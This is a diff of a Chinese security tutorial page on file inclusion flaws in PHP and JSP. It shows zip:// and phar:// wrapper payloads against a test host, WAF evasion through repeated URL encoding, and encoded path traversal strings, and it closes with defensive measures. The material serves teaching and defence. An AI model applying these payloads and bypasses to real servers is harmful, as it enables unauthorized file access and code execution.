-![](../../.gitbook/assets/image%20%28927%29.png)
+![](<../../.gitbook/assets/image (927).png>)
 
 ### 13.2 绕过方法二 - zip协议
 
@@ -1589,15 +1475,15 @@ if(isset($_GET['x']))
 
 接着 111.zip 改名为 111.jpg
 
-攻击payload:  ``http://atest.test/2.php?x=zip://111.jpg%231 
+攻击payload: `` http://atest.test/2.php?x=zip://111.jpg%231&#x20;
 
-![](../../.gitbook/assets/image%20%28921%29.png)
+![](<../../.gitbook/assets/image (921).png>)
 
 ### 13.3 绕过方法三 - phar协议
 
 新建一个名为1.html的文件，内容为`<?php phpinfo();?>`，然后压缩为名为111.zip的zip文件。
 
-  
+\
 如果可以上传zip文件则上传zip文件，若不能则重命名为111.jpg后上传。
 
 攻击payload-1: [http://atest.test/2.php?x=phar://111.jpg%2F1](http://atest.test/2.php?x=phar://111.jpg%252F1)
@@ -1610,49 +1496,49 @@ if(isset($_GET['x']))
 
 如果可以上传 zip 那么就使用payload-2
 
-参考[https://www.yuque.com/pmiaowu/web\_security\_1/yzr176\#QKRsZ](https://www.yuque.com/pmiaowu/web_security_1/yzr176#QKRsZ)
+参考[https://www.yuque.com/pmiaowu/web\_security\_1/yzr176#QKRsZ](https://www.yuque.com/pmiaowu/web\_security\_1/yzr176#QKRsZ)
 
 **总结**
 
-通过实验发现这个可能是编码的问题因为&lt;?php phpinfo\(\);?&gt;在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法
+通过实验发现这个可能是编码的问题因为\<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法
 
-* 不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。
+* 不写后面的?> 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?>作为结束。
 * 添加空格改变base64编码。
 * 将+号换成%2b
 
-将&lt;?php phpinfo\(\);?&gt;改变成url编码
+将\<?php phpinfo();?>改变成url编码
 
-![](../../.gitbook/assets/image%20%28911%29.png)
+![](<../../.gitbook/assets/image (911).png>)
 
 
 
 ## 14、JSP包含
 
- **\#静态包含**
+&#x20;**#静态包含**
 
 Jsp中的静态包含语句为
 
-&lt;%@ include file=”page.txt”%&gt;
+<%@ include file=”page.txt”%>
 
 编写好page.txt后访问index.asp,page.txt将会被解析。Jsp语法规定include指令为静态包含只能调用已经存在于服务器中的文件，因此include指令将不存在文件包含漏洞。
 
-               \# **动态包含**
+&#x20;              \# **动态包含**
 
-动态包含语句为：&lt;jsp:include page=”page.txt”/&gt;
+动态包含语句为：\<jsp:include page=”page.txt”/>
 
 与静态包含相反在运行时会先处理被包含的页面，然后再包含，而且可以包含一个动态页面。
 
 ## 15、WAF
 
-当碰到 WAF 时，可以把 &lt;&gt; 这些特殊符号进行编码再试。
+当碰到 WAF 时，可以把 <> 这些特殊符号进行编码再试。
 
-如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过        
+如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过       &#x20;
 
-特殊字符绕过        
+特殊字符绕过       &#x20;
 
-某些情况下，读文件支持使用Shell通配符，如 ? \* 等        
+某些情况下，读文件支持使用Shell通配符，如 ? \* 等       &#x20;
 
-url中 使用 ? \# 可能会影响include包含的结果        
+url中 使用 ? # 可能会影响include包含的结果       &#x20;
 
 某些情况下，unicode编码不同但是字形相近的字符有同一个效果
 
@@ -1660,7 +1546,7 @@ url编码、双层（多层）url编码
 
 %2e%2e%2f   解码：../
 
-%2e%2e%5c  解码：..\
+%2e%2e%5c  解码：..\\
 
 %25%2e%25%2e%255c 解码：..\（可使用burp多层编码和解码）
 
@@ -1668,15 +1554,14 @@ uniclode/UTF-8编码
 
 ..%c0%af  解码：../
 
-%c1%9c  解码：..\
+%c1%9c  解码：..\\
 
 但编码能否正确的起到效果，得看web server是否能对编码后的做解析
 
 ## 16、文件包含防御
 
 * PHP中使用open\_basedir配置限制访问在指定目录的区域
-* 过滤.\(点）/（反斜杠）\（反斜杠）
+* 过滤.(点）/（反斜杠）\（反斜杠）
 * 禁止服务器远程文件包含
 * 尽量不要使用动态包含，可以在需要包含的页面固定写好
-* 可以通过调用str\_replace\(\)函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。
-
+* 可以通过调用str\_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。
